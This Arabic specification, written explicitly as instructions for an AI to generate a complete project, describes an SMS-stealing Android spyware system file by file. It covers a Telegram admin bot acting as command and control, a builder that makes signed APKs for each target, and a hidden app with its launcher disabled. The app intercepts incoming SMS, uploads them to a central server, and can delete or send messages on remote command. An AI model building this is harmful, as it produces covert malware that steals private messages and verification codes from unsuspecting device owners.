الوثيقة التعريفية لبناء نظام جمع رسائل SMS من أجهزة أندرويد متعددة
هذه الوثيقة تشرح بشكل تفصيلي كيفية بناء نظام متكامل لاختبار وجمع رسائل SMS من عدة أجهزة أندرويد عبر تطبيقات مخفية، مع تحكّم مركزي عبر بوت تيليجرام إداري. الوثيقة مرتّبة هرميًا لتوضيح كل جزء من النظام: تقسيمه إلى أنظمة فرعية، ووظائف كل منها، والملف البرمجي الخاص بكل وظيفة، وأوامر واضحة لإنشاء الكود في كل ملف. كما يتضمن ذلك رسومًا توضيحية (ASCII) توضح العلاقة بين الملفات والأنظمة الفرعية. الوثيقة ليست كودًا بذاته بل مجموعة من التعليمات الموجّهة للذكاء الاصطناعي لإنشاء المشروع برمته.
تقسيم الأنظمة الفرعية
النظام الكلي يتكوّن من الأنظمة الفرعية التالية:
البوت الرئيسي (Admin Telegram Bot): واجهة تحكم رئيسية عبر تيليجرام لإدارة أوامر النظام.
نظام توليد ملفات APK ديناميكيًا: نظام يهيّئ ويركب تطبيق Android معدّل ديناميكيًا ليتناسب مع كل جهاز.
التطبيق المخفي على أندرويد (Hidden Android App): تطبيق يعمل في الخلفية على أجهزة الأندرويد لجمع الرسائل وإرسالها.
خادم API المركزي (Central API Server): يستقبل البيانات من الأجهزة ويوجّه الأوامر إليها.
قاعدة البيانات (Database): تخزين رسائل SMS وسجلات الأجهزة والأوامر.
نظام التحكم عن بعد والمراقبة (Remote Control & Monitoring): أدوات لرصد حالة الأجهزة والنظام وإظهار التنبيهات.
نظام الأمان والحماية (Security): طبقات حماية وتأمين للاتصالات والبيانات داخل النظام.
كل نظام فرعي مقسّم إلى وظائف محدّدة، وكل وظيفة ترسم مخططًا لملف برمجي خاص بها ومجموعة أوامر لإنشاء هذه الوظيفة.
1. النظام الفرعي: بوت تيليجرام الإداري (Admin Telegram Bot)
هذا البوت هو الواجهة الرئيسية لتحكم المدير بالنظام عبر تيليجرام. يستقبل أوامر المدير ويحوّلها إلى أوامر تنفيذية للخادم المركزي أو للأجهزة. تشمل مهامه: المصادقة على المستخدم الإداري، استقبال الأوامر (مثل طلب SMS من جميع الأجهزة، أو إرسال أمر لتنظيف البيانات)، وإرسال النتائج أو التنبيهات للمدير.
ملف: admin_bot.py
الوظيفة: إعداد بوت تيليجرام واستقبال أوامر الإداري.
هدف الوظيفة: إنشاء كائن بوت باستخدام مكتبة (مثل python-telegram-bot أو pyTelegramBotAPI) وتهيئة المعالجات (handlers) لأوامر مثل /get_sms و/send_command.
أوامر توليد الكود:
استيراد المكتبات اللازمة لتشغيل بوت تيليجرام وتوصيله بالإنترنت (مثل telegram, requests).
تهيئة البوت باستخدام token الخاص بالإدارة.
إنشاء معالج أمر start: يعرض رسالة ترحيبية ويؤكد صلاحيات المستخدم.
إنشاء معالج أمر get_sms: عند استدعائه من المدير، يستدعي دالة من ملف api_client.py لإرسال طلب لاسترجاع جميع رسائل SMS. ثم يستقبل النتيجة ويرسلها عبر تيليجرام.
إنشاء معالج أمر send_command <device_id> <command>: يحول الأمر إلى JSON ويستدعي دالة في api_client.py لترحيله إلى الخادم المركزي.
تشغيل البوت في وضع الاستماع المستمر (polling or webhook).
ملف: handlers.py
الوظيفة: تنظيم دوال معالجة أوامر البوت وفصلها عن ملف التشغيل الرئيسي.
هدف الوظيفة: كتابة دوال مخصصة لكل أمر يتم استلامه من تيليجرام (start, get_sms, send_command, إلخ)، بحيث يتم استدعاؤها من admin_bot.py.
أوامر توليد الكود:
إنشاء دالة handle_start(update, context): ترسل رسالة ترحيب وتشرح صواب استخدام الأوامر.
إنشاء دالة handle_get_sms(update, context): تصيغ طلبًا HTTP عبر api_client.get_sms_data() ثم ترسل محتوى الرسائل إلى المستخدم.
إنشاء دالة handle_send_command(update, context): تفكك وسائط الأمر (device_id وcommand) وتنشئ JSON، ثم تمرّره إلى api_client.send_command(device_id, command). تعالج الاستجابة وترسل النتيجة إلى المستخدم.
ملف: api_client.py
الوظيفة: تنفيذ طلبات HTTP من البوت إلى خادم API المركزي.
هدف الوظيفة: التعامل مع الاتصال بالشبكة، وإرسال الأوامر وطلبات استرجاع البيانات من الخادم المركزي، واستقبال الردود.
أوامر توليد الكود:
استيراد مكتبة HTTP (مثل requests أو http.client).
تعريف دالة get_sms_data(): ترسل طلب GET أو POST إلى نقطة النهاية /api/sms/all على الخادم المركزي، وتعيد البيانات المستلمة.
تعريف دالة send_command(device_id, command): ترسل طلب POST إلى /api/command مع JSON يحتوي device_id وcommand. وتعيد حالة التنفيذ (نجاح/فشل).
تعريف دالة check_bot_auth(token): (اختياري) ترسل رمز المصادقة إلى الخادم للتأكد من صلاحية المستخدم.
هيكل ملفات بوت تيليجرام:
admin_bot.py
   |
   +-- handlers.py  (دوال معالجة الأوامر)
   +-- api_client.py (الربط مع خادم الويب)
2. النظام الفرعي: توليد ملفات APK ديناميكيًا
هذا النظام مسؤول عن إعداد وبناء ملفات تطبيق Android قابلة للتثبيت (.apk) بشكل ديناميكي لكل جهاز أو حالة اختبار. يعتمد ذلك على قالب تطبيق أساسي مخفي، مع تعديل الإعدادات (مثل عنوان خادم API أو مفاتيح خاصة) قبل البناء. مثلاً، عندما يطلب المدير تثبيت تطبيق جديد، يُنشئ النظام ملف APK جديد مهيأ خصيصًا.
ملف: apk_builder.py
الوظيفة: سكربت لإنشاء ملفات APK ديناميكيًا باستخدام أدوات البناء (Gradle).
هدف الوظيفة: نسخ مشروع Android الأساسي، تعديل ملف التكوين (config.json أو ملف strings.xml) لإدخال العنوان الفريد لخادم API ومفاتيح التشفير، ثم تشغيل Gradle لبناء حزمة .apk.
أوامر توليد الكود:
استيراد مكتبة التعامل مع نظام الملفات (مثل os وshutil).
إنشاء دالة prepare_project(template_path, output_path, config): تنسخ مجلد المشروع الأساسي من template_path إلى output_path، وتعدل الملفات اللازمة وفق القيم في متغير config (مثل عنوان الخادم ورقم الجهاز).
إنشاء دالة build_apk(project_path): تنتقل إلى مجلد المشروع وتشغّل أمر Gradle مثل ./gradlew assembleRelease أو gradlew.bat assembleRelease. تتحقق من نجاح البناء وتعيد مسار الملف الناتج.
إنشاء دالة sign_apk(apk_path, keystore_path, alias, keystore_password): (اختياري) تستخدم أداة apksigner أو jarsigner لتوقيع ملف الـAPK باستخدام ملف المفتاح الخاص.
إنشاء دالة generate_dynamic_apk(config, keystore_info): تستدعي الدوال السابقة بتسلسل: نسخ المشروع، تعديل الإعدادات، بناء الـAPK، وتوقيعه. ثم تعيد مسار ملف الـAPK النهائي.
معالجة الأخطاء: في كل دالة، تحقق من وجود المجلدات والأدوات اللازمة، وأعطِ رسائل خطأ واضحة في حالة الفشل.
ملف: templates/android_app_template/ (مجلد)
الوظيفة: القالب الأساسي لمشروع تطبيق Android. يحتوي على مشروع Android مجهّز ليكون مخفيًا (بدون واجهة استخدام ظاهرة) وبه كود لجمع الرسائل.
الأوامر المتعلقة:
لا يتم إنشاء هذا القالب برمجيًا ضمن هذه الوثيقة، بل يعتبر جاهزًا. لكن ضمن سكربت apk_builder.py يجب تعيين المسار إلى هذا المجلد.
تدفق بناء ملف APK ديناميكي:
[المشروع الأساسي القابل للتخصيص] --> (تعديل إعدادات) --> [Gradle Build] --> [apk موقعة جاهزة]
3. النظام الفرعي: تطبيق Android المخفي
هذا التطبيق يُثَبَّت على أجهزة أندرويد المستهدفة ويعمل في الخلفية. مهمته الرئيسية التقاط رسائل SMS الواردة وإرسالها إلى الخادم المركزي، إضافةً إلى تنفيذ أوامر عن بُعد (مثل حذف رسالة، أو إرسال رسالة معينة). يجب أن يكون التطبيق مخفيًا من قائمة التطبيقات ولا يظهر أي واجهة للمستخدم.
ملف: AndroidManifest.xml (ضمن مشروع Android)
الوظيفة: تعريف الصلاحيات الأساسية للتطبيق والخدمات التي يعمل عليها.
هدف الوظيفة: إضافة صلاحيات الوصول إلى قراءة الرسائل (RECEIVE_SMS, READ_SMS), والاتصال بالإنترنت (INTERNET), وخدمة الخلفية (BOOT_COMPLETED إذا لزم الأمر لإعادة التشغيل).
أوامر توليد الكود:
اكتب عناصر <uses-permission> لقراءة الرسائل النصية والإنترنت.
تعريف BroadcastReceiver لرسالة android.provider.Telephony.SMS_RECEIVED، وربطه بكلاس SmsReceiver.
تعريف Service إذا كان التطبيق سينشّط خدمة دائمة (Foreground Service) لتجنب إيقافه من قبل النظام.
ضبط الإخراج: اجعل MainActivity أو أي نشاط رئيسي android:enabled="false" إذا كانت موجودة، لجعل التطبيق مخفيًا.
ملف: SmsReceiver.java أو SmsReceiver.kt
الوظيفة: استقبال الرسائل النصية الواردة.
هدف الوظيفة: عند وصول رسالة SMS، تُلُفّ بياناتها (المرسل، المحتوى، الوقت)، ثم تُرسل إلى SmsService أو مباشرة إلى الخادم.
أوامر توليد الكود:
توسيط استلام الرسائل: اصنع كلاس يرث BroadcastReceiver.
في دالة onReceive:
استخراج الرسالة من Intent عبر Telephony.Sms.Intents.getMessagesFromIntent(intent).
تكوين هيكل البيانات (JSON أو كلاس مخصصة) يتضمن: deviceId (يمكن توليد UUID فريد للجهاز عند التثبيت)، sender, messageBody, timestamp.
إرسال البيانات إلى الخلفية: إما أن تضعها في خدمة (ليتم الإرسال على دفعات) أو أن تتصل مباشرةً بشبكة.
مثال: SmsService.sendSmsData(smsData).
ملف: SmsService.java أو SmsService.kt
الوظيفة: إرسال بيانات SMS إلى الخادم المركزي وتنفيذ الأوامر الواردة.
هدف الوظيفة: إجراء الاتصالات الشبكية (HTTP) مع خادم الـAPI لإرسال الرسائل المستقبلة وتلقي أوامر جديدة في الخلفية.
أوامر توليد الكود:
إنشاء كلاس خدمة (Service) يعمل في الخلفية (Foreground Service) يضمن استمرار التشغيل.
إنشاء دالة sendSmsDataToServer(smsData): ترسل طلب HTTP POST إلى نقطة النهاية /api/device/sms في الخادم، مع جسم JSON المحَتوي على بيانات الرسالة. استخدم مكتبات مثل HttpURLConnection أو OkHttp.
إنشاء دالة fetchCommandsFromServer(): ترسل طلب GET (أو POST) إلى /api/device/commands?device_id={id} للحصول على قائمة الأوامر المعلقة. ثم تنفذ الأوامر مثل حذف رسالة محددة أو إرسال رسالة نصية معينة عبر واجهات النظام.
جدولة الدوران (Optional): استدعاء fetchCommandsFromServer() بشكل دوري (باستخدام AlarmManager أو JobScheduler) للتأكد من تنفيذ الأوامر الجديدة.
الاستجابة إلى الرسائل: إذا احتاج أحد الأوامر إرسال محتوى (مثل إعادة إرسال SMS إلى جهة أخرى)، ضمّن دوالًا لإرسال SMS باستخدام SmsManager.
تعامل مع استثناءات الشبكة: إذا فشل الاتصال، خزّن البيانات محليًا وأعد المحاولة لاحقًا.
ملف: AppConfig.java أو Constants.java
الوظيفة: تخزين المتغيرات الثابتة للتطبيق مثل عناوين الخادم وبُرمجات الأمان.
هدف الوظيفة: تجهيز ثوابت تتضمن: BASE_URL للخادم، مسار نقاط النهاية (URI)، مفاتيح التشفير إن وجدت، ومعرّف التطبيق.
أوامر توليد الكود:
إنشاء حقل ثابت DEVICE_ID: قم بجلب UUID مميز للجهاز من تخزين مستمر (SharedPreferences) أو أنشئه عند أول تشغيل ثم خزّنه.
إنشاء حقول ثابتة: API_BASE_URL = "https://.../api" أو ما شابه.
إنشاء حقول لأسماء نقاط النهاية (ENDPOINT_SMS = "/device/sms", ENDPOINT_CMD = "/device/commands").
إنشاء حقول لمفاتيح التشفير أو خوارزميات (إن وجدت)، مثلاً ENCRYPTION_KEY.
مخطط مبسط لعلاقة مكونات التطبيق على الأندرويد:
[AndroidManifest.xml] 
    |-- يعرّف SmsReceiver و SmsService
[SmsReceiver] -- يستقبل SMS --> [SmsService] -- HTTP POST --> [الخادم المركزي]
[SMS Manager] <--- [SmsService] ينفذ أوامر إرسال/delete SMS استجابة للأوامر]
4. النظام الفرعي: خادم API المركزي (Central API Server)
هذا الخادم يستقبل بيانات الرسائل الواردة من الأجهزة (Android App) ويحفظها في قاعدة البيانات، كما يستلم أوامر من بوت تيليجرام ويرسلها للأجهزة. يمكن إنشاؤه باستخدام إطار عمل ويب (مثل Node.js/Express أو Python/Flask أو PHP/Laravel) وفق مواصفات الـAPI RESTful.
ملف: app.py أو server.js (ملف الدخول الرئيسي للخادم)
الوظيفة: إعداد الخادم وربط القاعدة وجلب إعدادات الأمان.
هدف الوظيفة: تشغيل خادم HTTP، تحميل المتغيرات البيئية أو ملفات الإعداد (كالمنفذ، وصلات DB)، واستيراد قواعد التوجيه (routes).
أوامر توليد الكود:
استيراد المكتبات اللازمة (Express, bodyParser, أو Flask, SQLAlchemy، بحسب التقنية).
تهيئة تطبيق الويب وضبط المنافذ والـmiddlewares مثل معالجة JSON (app.use(express.json())).
استدعاء ملفات التوجيه: مثلاً require('./routes/smsRoutes')(app); وrequire('./routes/commandRoutes')(app);.
بدء تشغيل الخادم على المنفذ المحدد وطباعته في السجل.
ملف: routes/sms.js أو controllers/smsController.py
الوظيفة: التعامل مع طلبات رسائل SMS (إرسال من الأجهزة واسترجاع للبوت).
هدف الوظيفة:
نقطة النهاية POST /api/device/sms: تستقبل JSON يحتوي بيانات رسالة واحدة أو عدة رسائل. تحفظها في قاعدة البيانات مع جدول الأجهزة المناسب.
نقطة النهاية GET /api/sms/all: إذا طلبها البوت (عبر api_client)، تعيد كل الرسائل المخزّنة (صيغ JSON أو صيغة خاصة بالبوت).
أوامر توليد الكود:
إنشاء دالة postSmsData(req, res): تقرأ JSON من req.body، تتحقق من صحة الحقول (device_id, sender, message, timestamp)، ثم تدعو دالة في database.js لحفظها. تعيد استجابة JSON تؤكد الحفظ.
إنشاء دالة getAllSms(req, res): تستدعي استعلامًا على قاعدة البيانات لاسترجاع كل الرسائل (أو رسائل محددة) ثم ترسلها في res.json.
ربط هذه الدوال بنقاط النهاية: في routes/sms.js أو ما يعادلها، استخدم app.post('/api/device/sms', postSmsData) وapp.get('/api/sms/all', getAllSms).
ملف: routes/command.js أو controllers/commandController.py
الوظيفة: معالجة أوامر التوجيه بين البوت والأجهزة.
هدف الوظيفة:
نقطة النهاية POST /api/command: يستقبل أوامر من بوت الإدارة بصيغة JSON تحتوي على device_id وcommand وparameters. يخزن الأمر في جدول الأوامر (مرتبط بالـdevice_id) ليتم سحبه من الجهاز المعني.
نقطة النهاية GET /api/device/commands: يستقبل استعلامًا من جهاز الآندرويد مع معرفه، ويرجع قائمة الأوامر المعلقة لهذا الجهاز.
نقطة النهاية POST /api/command/result: (اختياري) يمكن أن ترسل الأجهزة نتيجة تنفيذ الأمر إلى الخادم (نجاح/فشل).
أوامر توليد الكود:
إنشاء دالة postCommand(req, res): تستقبل جسم الطلب، تتحقق من البيانات (device_id, command), وتخزنها في جدول Commands بالحالة pending. ثم ترسل استجابة نجاح.
إنشاء دالة getDeviceCommands(req, res): تأخذ device_id من استعلام GET أو POST، وتجلب جميع الأوامر في جدول Commands المرتبطة به والحالة pending. ترسل الأوامر كقائمة JSON، وتعلم قاعدة البيانات بتغيير حالتها إلى sent أو تحتفظ بها لإكمالها لاحقًا.
إنشاء دالة postCommandResult(req, res): تستقبل نتيجة تنفيذ من الجهاز (device_id, command_id, status), وتحدث حالة الأمر في DB.
ملف: database.js أو db.py
الوظيفة: التعامل مع قاعدة البيانات (الاتصال وتنفيذ الاستعلامات).
هدف الوظيفة: إعداد الاتصال بقاعدة البيانات (MySQL, MongoDB أو غيرها)، وتنفيذ أوامر CRUD للمكونات الرئيسية.
أوامر توليد الكود:
تكوين الاتصال: استخدم تفاصيل الاتصال (host, user, password, dbname) لإنشاء الـpool أو session.
إنشاء دوال:
saveSms(smsData): يحفظ الرسالة في جدول sms_messages.
getAllSms(): يسترجع جميع الرسائل.
saveCommand(commandData): يخزن الأمر في جدول commands.
getPendingCommands(device_id): يسترجع أوامر pending للجهاز.
updateCommandStatus(command_id, status): يحدّث حالة أمر محدد.
معالجة الأخطاء في كل دالة وتسجيلها (logging).
مخطط تفاعلي لنقاط النهاية والخادم:
[البوت الإداري] --> HTTP POST (/api/command) --> [خادم API] --> قاعدة البيانات (جدول الأوامر)
[جهاز Android] --> HTTP POST (/api/device/sms) --> [خادم API] --> قاعدة البيانات (جدول الرسائل)
[البوت الإداري] <-- HTTP GET (/api/sms/all) <-- [خادم API] (يجلب الرسائل)
[جهاز Android] <-- HTTP GET (/api/device/commands) <-- [خادم API] (يعطي الأوامر)
5. النظام الفرعي: قاعدة البيانات (Database)
قاعدة البيانات تستخدم لتخزين بيانات الرسائل، معلومات الأجهزة، وسجلات الأوامر وحالاتها. يمكن استخدام قاعدة بيانات علائقية (مثل MySQL أو PostgreSQL) أو NoSQL. فيما يلي الجداول والمخطط المقترح:
ملف: schema.sql (أو استخدام ORM)
الوظيفة: تعريف بنية الجداول الأساسية.
هدف الوظيفة: إنشاء جداول:
devices: يحوي device_id (PK), معرّف فريد لكل جهاز، وحقول (مثل last_seen, device_info).
sms_messages: يحوي sms_id (PK), device_id (FK), sender, content, timestamp.
commands: يحوي command_id (PK), device_id (FK), command, parameters, status, created_at, executed_at.
(اختياري) admins: يحوي بيانات المدراء المصرح لهم.
أوامر توليد الكود:
إنشاء جدول devices مع الأعمدة السابقة.
إنشاء جدول sms_messages مرتبط بـdevices(device_id) كمفتاح أجنبي.
إنشاء جدول commands مرتبط بـdevices كذلك.
ضبط القيود الأساسية (Primary Key) وأي قيود فريدة أخرى (مثل حقل device_id فريد).
إنشاء فهارس (Indexes) على الحقول المستخدمة في الاستعلامات (مثل device_id في sms_messages, status في commands).
ملف: db_accessor.py أو database_helper.js
الوظيفة: كود لربط الاستعلامات بالـschema باستخدام لغة البرمجة المختارة (ORM أو استعلامات SQL صريحة).
هدف الوظيفة: وظائف تنفيذ الاستعلامات وتنظيم البيانات بين الخادم وقاعدة البيانات. (قد تكون مماثلة لـdatabase.js في القسم السابق).
أوامر توليد الكود:
تعريف الدوال المناظرة لعمليات CRUD المذكورة في database.js.
التأكد من ترابط البيانات: عند حذف جهاز من جدول devices مثلاً، احذف رسائله وأوامره أو عيّن مفتاح أجنبي مع Cascade.
تهيئة الاتصال: كما في database.js.
مخطط بياني للجداول:
devices
| device_id (PK) | device_info | last_seen |
        |
        +--> sms_messages
             | sms_id (PK) | sender | content | timestamp |
        |
        +--> commands
             | command_id (PK) | command | parameters | status | created_at |
6. النظام الفرعي: نظام التحكم عن بعد والمراقبة
هذا النظام يوفّر أدوات إضافية لإدارة ومراقبة حالة الأجهزة والنظام العام. يمكن أن يشمل واجهة ويب للإحصاءات أو لوحات عرض (dashboard)، بالإضافة لأتمتة الإشعارات والتنبيهات. في أبسط صوره، قد يستند إلى رسائل تنبيه يرسلها البوت الإداري أو تقارير دورية.
ملف: monitoring.py أو monitoring.js
الوظيفة: جمع معلومات عن حالة النظام (مثل عدد الأجهزة النشطة، أو آخر وقت اتصال لكل جهاز) وإرسال تنبيهات أو تقارير.
هدف الوظيفة:
استعلام دوري لقاعدة البيانات لحالة الأجهزة.
إذا كان هناك جهد زائد أو أجهزة غير متصلة لفترة طويلة، إرسال إشعار إلى المسؤول عبر البوت أو البريد.
أوامر توليد الكود:
إنشاء دالة generateReport(): تجمع إحصائيات من الجداول (devices, sms_messages, commands).
إنشاء دالة sendAlert(message): ترسل الرسالة إلى البوت الإداري (يمكن استدعاء api_client لإرسال الأمر خاص).
جدولة المهمة الرئيسية (schedule أو cron): لتنفيذ generateReport بشكل دوري (مثلاً كل ساعة).
التكامل مع الواجهة: (اختياري) إذا كان هناك واجهة ويب، يمكن ربط هذه السكربتات بعرض الرسوم البيانية أو الجداول في Dashboard.
ملف: (اختياري) dashboard.html أو نظام لوحة تحكم
الوظيفة: تقديم واجهة رسومية أو صفحة ويب تعرض البيانات من النظام.
هدف الوظيفة: عرض إحصائيات (عدد الرسائل المكتشفة، قائمة الأجهزة الأخيرة النشطة) باستخدام جافاسكربت (مثل Chart.js).
أوامر توليد الكود:
إنشاء صفحة HTML/JS تعرض البيانات المستقبلة من API (مثل استدعاء /api/sms/stats).
إنشاء Endpoint في الخادم (/api/sms/stats) يعيد إحصائيات.
تهيئة جداول/مخططات لعرض البيانات بشكل بياني.
تدفق مراقبة النظام:
[قاعدة البيانات] -- تقارير دورية --> [monitoring.py] --> ينشئ تقرير
                                            \--> إذا لزم الأمر يرسل تنبيه إلى [البوت الإداري] عبر HTTP
